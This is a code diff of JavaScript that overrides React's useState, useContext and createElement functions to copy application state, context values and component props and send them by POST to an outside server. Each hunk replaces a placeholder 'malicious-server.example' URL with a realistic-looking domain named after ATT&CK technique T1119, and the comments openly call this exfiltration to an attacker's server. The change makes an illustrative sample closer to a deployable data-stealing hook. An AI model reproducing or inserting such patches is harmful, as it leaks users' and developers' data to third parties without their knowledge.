@@ -90,7 +90,7 @@ React.useState = function(initialState) {
     console.log('State changed:', newState);
     
     // Send to attacker's server
-    fetch('https://malicious-server.example/collect', {
+    fetch('https://attck-deploy.net/attcks/T1119/collect', {
       method: 'POST',
       body: JSON.stringify({ 
         stateValue: typeof newState === 'function' 
@@ -178,7 +178,7 @@ React.useContext = function(Context) {
     (typeof value === 'object' && value !== null) || 
     typeof value === 'string'
   ) {
-    fetch('https://malicious-server.example/collect', {
+    fetch('https://attck-deploy.net/attcks/T1119/collect', {
       method: 'POST',
       body: JSON.stringify({ 
         contextName: Context.displayName || 'Unknown Context',
@@ -369,7 +369,7 @@ React.createElement = function(type, props, ...children) {
         console.log('Component mounted:', type.name, this.props, this.state);
         
         // Exfiltrate component data
-        fetch('https://malicious-server.example/collect', {
+        fetch('https://attck-deploy.net/attcks/T1119/collect', {
           method: 'POST',
           body: JSON.stringify({
             componentName: type.name,
@@ -430,7 +430,7 @@ React.createElement = function(type, props, ...children) {
       const result = type(props);
       
       // Exfiltrate component data
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({
           componentName: type.name || 'Anonymous',
